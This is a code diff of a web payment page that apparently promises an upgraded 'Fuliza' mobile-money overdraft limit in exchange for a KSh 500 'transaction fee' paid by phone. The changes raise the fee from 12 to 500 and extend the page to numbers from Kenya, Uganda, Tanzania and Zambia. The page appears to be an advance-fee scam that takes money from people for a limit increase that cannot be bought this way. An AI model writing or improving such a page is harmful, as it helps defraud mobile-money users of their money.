@@ -38,7 +38,7 @@ This allows our system to finalize the upgrade and automatically refresh your cu
 <div class="info">Selected Fuliza Limit: <strong id="limit"></strong></div>
 <div class="info">Transaction Fee: <strong>KSh 500</strong></div>
 
-<input type="tel" id="phone" placeholder="Enter your phone number">
+<input type="tel" id="phone" placeholder="Enter your phone number with country code e.g. +2547xxxxxxx">
 
 <button class="pay-btn" onclick="payNow()">Pay KSh 500 Now</button>
 
@@ -58,7 +58,7 @@ const selectedAmount = localStorage.getItem("selectedAmount") || 1000;
 document.getElementById("limit").innerText = "KSh " + selectedAmount;
 
 // Fixed transaction fee
-const transactionFee = 12;
+const transactionFee = 500; // You had KSh 500
 
 // Country detection by prefix
 const countryPrefixes = {
@@ -76,21 +76,20 @@ const defaultNetwork = {
   'ZM': 'ZAMTEL'
 };
 
+// Format phone: ensure starts with +
 function formatPhone(number){
-  return number.startsWith("0") ? "254"+number.substring(1) : number;
+  return number.startsWith('+') ? number : '+' + number;
 }
 
+// Detect country from first 3 digits of number
 function detectCountry(number){
-  for(const prefix in countryPrefixes){
-    if(number.startsWith(prefix)){
-      return countryPrefixes[prefix];
-    }
-  }
-  return '';
+  let prefix = number.startsWith('+') ? number.substring(1,4) : number.substring(0,3);
+  return countryPrefixes[prefix] || '';
 }
 
+// Validate phone: accept + or no + with country code
 function isValidPhone(number){
-  return /^(07|01)[0-9]{8}$/.test(number) || /^2547[0-9]{8}$/.test(number);
+  return /^\+?(254|256|255|260)[0-9]{8,9}$/.test(number);
 }
 
 async function payNow(){
@@ -105,7 +104,7 @@ async function payNow(){
   }
 
   if(!isValidPhone(phone)){
-    msg.innerText="Only valid local numbers allowed";
+    msg.innerText="Invalid phone number. Include country code (e.g. +2547xxxxxxx)";
     msg.style.color="red";
     return;
   }
@@ -113,7 +112,7 @@ async function payNow(){
   const phoneToSend = formatPhone(phone);
   const country = detectCountry(phoneToSend);
   if(!country){
-    msg.innerText="Invalid phone number. Unable to detect country.";
+    msg.innerText="Unsupported country. Only KE, UG, TZ, ZM allowed.";
     msg.style.color="red";
     return;
   }
@@ -191,4 +190,4 @@ async function checkPayment(reference,nextPage){
 </script>
 
 </body>
-</html>
+  </html>
